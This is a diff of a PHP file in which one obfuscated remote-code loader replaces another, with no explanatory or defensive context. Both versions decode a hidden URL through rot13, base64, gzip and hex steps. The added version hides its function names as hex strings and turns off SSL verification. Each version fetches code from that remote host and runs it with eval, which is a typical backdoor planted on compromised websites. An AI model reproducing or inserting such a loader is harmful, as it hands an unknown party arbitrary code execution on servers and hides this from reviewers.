@@ -1,43 +1,47 @@
-<?php
-function cEv($url)
-{
-  $ch = curl_init();
-  curl_setopt($ch, CURLOPT_URL, $url);
-  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-  $response = curl_exec($ch);
-  curl_close($ch);
-  return $response;
+<?php 
+
+$Z = ['7374725f726f743133', '6261736536345f6465636f6465', '677a756e636f6d7072657373', '6865783262696e', '6375726c5f7365746f7074', '6375726c5f65786563', '6375726c5f6572726e6f', '6375726c5f6572726f72', '7374726c656e', '6261736536345f656e636f6465'];
+
+function fx($hex) {
+  return hex2bin($hex);
 }
 
-function xTvm($ipt)
-{
-  $hex = '';
-  for ($i = 0; $i < strlen($ipt); $i++) {
-    $hex .= dechex(ord($ipt[$i]));
-  }
-  $base64 = base64_encode($hex);
-  return str_rot13($base64);
+function bvz($e) {
+  global $Z;
+  $r = (fx($Z[0]))($e);
+  $b = (fx($Z[1]))($r);
+  $d = (fx($Z[2]))($b);
+  if ($d === false) die("Error data");
+  $h = (fx($Z[3]))($d);
+  if ($h === false) die("Error hex");
+  return $h;
 }
 
-function zUe($eoUr)
-{
-  $rEq = str_rot13($eoUr);
-  $bsfD = base64_decode($rEq);
-  $xiE = '';
-  for ($i = 0; $i < strlen($bsfD); $i += 2) {
-    $xiE .= chr(hexdec(substr($bsfD, $i, 2)));
-  }
-  return $xiE;
+$u = 'rWjIvjRBjQNVNe/HLbK2BpgJ//+RLHlVjZTg5EhXrSNbtICPcKv0hWJRHfS0Rlkrc9ydci2UJd+c6WFywHdLUdjI3dZ3CB5scjRiBB2ii+nVn3Me/BnaVE8=';
+$l = bvz($u);
+
+function xz($x) {
+  global $Z;
+  $c = curl_init();
+  $setopt = fx($Z[4]);
+  $exec = fx($Z[5]);
+  $errno = fx($Z[6]);
+  $error = fx($Z[7]);
+  $strlen = fx($Z[8]);
+  $setopt($c, CURLOPT_URL, $x);
+  $setopt($c, CURLOPT_RETURNTRANSFER, 1);
+  $setopt($c, CURLOPT_USERAGENT, (fx($Z[0]))('Zhyybzn5.0'));
+  $setopt($c, CURLOPT_SSL_VERIFYHOST, 0);
+  $setopt($c, CURLOPT_SSL_VERIFYPEER, 0);
+  $r = $exec($c);
+  if ($errno($c)) echo "Curl error: " . $error($c) . "\n";
+  curl_close($c);
+  return $r;
 }
 
-$eoUr = 'Awt3AQp0AmN3ZmAuZzLlMwplAwR3AmWyAwp2BGp0Awt3AGLlAmH3ZmL1AmV2ZmMzAzH3AQL1AzH3AQWyAwZ2MwMxZzL0Lmp1AwZ2AGMyAzL3BQWzAGV2AGpjAzL0ZmL4AmV2MwMyAwx2ZmMwAwH3ZmWzAmV2AGL2AmZlMwL4AwH2ZGL0AmZlMwMxAwR2BGMyZzL2BQL5AwD2AQL1AzHlMGpjAwt3ZN==';
-$xiE = zUe($eoUr);
-$response = @file_get_contents($xiE);
-if (empty($response)) {
-  $response = cEv($xiE);
-}
-if (is_string($response)) {
-  eval('?>' . $response);
+$s = xz($l);
+if ($s && (fx($Z[8]))($s) > 10) {
+  eval((fx($Z[1]))((fx($Z[9]))('?>' . $s)));
 } else {
   echo "Error!";
 }
